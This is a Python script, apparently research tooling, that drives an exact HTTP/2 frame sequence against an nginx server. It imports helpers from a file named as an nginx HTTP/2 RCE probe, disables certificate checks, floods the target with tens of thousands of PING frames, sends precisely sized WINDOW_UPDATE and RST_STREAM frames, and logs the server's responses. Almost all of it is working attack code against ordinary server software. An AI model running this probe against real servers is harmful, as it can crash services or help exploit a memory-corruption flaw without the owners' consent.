#!/usr/bin/env python3
"""Exact probe sequence with full frame logging (both targets)."""
import socket, ssl, struct, sys, os, importlib.util, time, collections

_mod_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "probe", "nginx-http2-rce-probe.py")
_spec = importlib.util.spec_from_file_location("probe_mod", _mod_path)
_m = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(_m)
globals().update({k: getattr(_m, k) for k in dir(_m) if not k.startswith("_")})

HOST = os.environ.get("PROBE_HOST", "localhost")
PORT = int(os.environ.get("PROBE_PORT", 443))
FLOOD = int(os.environ.get("FLOOD", 64000))
EPS = 76
EPS2 = 153

NAMES = {FRAME_DATA: "DATA", FRAME_HEADERS: "HEAD", FRAME_SETTINGS: "SETT",
         FRAME_PING: "PING", FRAME_GOAWAY: "GOAW", FRAME_WINDOW_UPDATE: "WIUP",
         FRAME_RST_STREAM: "RST "}

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
ctx.set_alpn_protocols(["h2"])
s = socket.create_connection((HOST, PORT), timeout=10)
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 16 * 1024)
ss = ctx.wrap_socket(s, server_hostname=HOST)
t0 = time.time()

ss.sendall(HTTP2_PREFACE)
ss.sendall(h2_frame(FRAME_SETTINGS, 0, 0))
reader = FrameReader(ss)
reader.next_frame(5)
ss.sendall(h2_frame(FRAME_SETTINGS, FLAG_ACK, 0))

path = "/probe-x-%d" % os.getpid()
send_headers(ss, 1, [(":method", "GET"), (":scheme", "https"),
                     (":authority", HOST), (":path", path)])
body = 0
end = time.time() + 5
while time.time() < end:
    f = reader.next_frame(1)
    if f is None:
        break
    ft, fl, sid, pl = f
    if ft == FRAME_DATA and sid == 1:
        body += len(pl)
        if fl & FLAG_END_STREAM:
            break
print("preflight body=%d (T+%.2f)" % (body, time.time() - t0))

send_window_update(ss, 0, MAX_WINDOW - DEFAULT_WINDOW)
print("T+%.2f: flood %d + 2000" % (time.time() - t0, FLOOD))
ping_flood(ss, FLOOD)
ping_flood(ss, 2000)
time.sleep(0.5)
send_headers(ss, 3, [(":method", "GET"), (":scheme", "https"),
                     (":authority", HOST), (":path", path)])
time.sleep(1.5)
print("T+%.2f: eps=%d" % (time.time() - t0, EPS))
send_window_update(ss, 0, EPS)
time.sleep(0.3)
send_rst_stream(ss, 3, ERR_CANCEL)
time.sleep(0.3)
print("T+%.2f: eps2=%d" % (time.time() - t0, EPS2))
send_window_update(ss, 0, EPS2)
send_ping(ss, MARK_PASS_A)
print("T+%.2f: drain" % (time.time() - t0))

counts = collections.Counter()
offset = 0
data_before_goaway = 0
deadline = time.time() + 20
while time.time() < deadline:
    try:
        f = reader.next_frame(1.0)
    except ConnectionClosed as e:
        print("T+%.2f CLOSED offset=%d: %s" % (time.time() - t0, offset, e))
        break
    if f is None:
        continue
    ft, fl, sid, pl = f
    offset += 9 + len(pl)
    counts[ft] += 1
    if ft == FRAME_PING and (fl & FLAG_ACK) and pl[:8] != FLOOD_TAG:
        print("T+%.2f offset=%d: marker ACK %r" % (time.time() - t0, offset, pl[:8]))
    elif ft == FRAME_GOAWAY:
        print("T+%.2f offset=%d: *** GOAWAY err=0x%x last_sid=%d (data seen: %d)"
              % (time.time() - t0, offset, int.from_bytes(pl[4:8], "big"),
                 int.from_bytes(pl[0:4], "big") & 0x7FFFFFFF, data_before_goaway))
        break
    elif ft == FRAME_DATA:
        data_before_goaway += len(pl)
        if counts[ft] <= 3:
            print("T+%.2f offset=%d: DATA sid=%d len=%d fin=%s" %
                  (time.time() - t0, offset, sid, len(pl), bool(fl & FLAG_END_STREAM)))
    elif ft == FRAME_RST_STREAM:
        print("T+%.2f offset=%d: RST sid=%d" % (time.time() - t0, offset, sid))
print("T+%.2f end. offset=%d frames=%s" %
      (time.time() - t0, offset, {NAMES.get(k, k): v for k, v in counts.items()}))
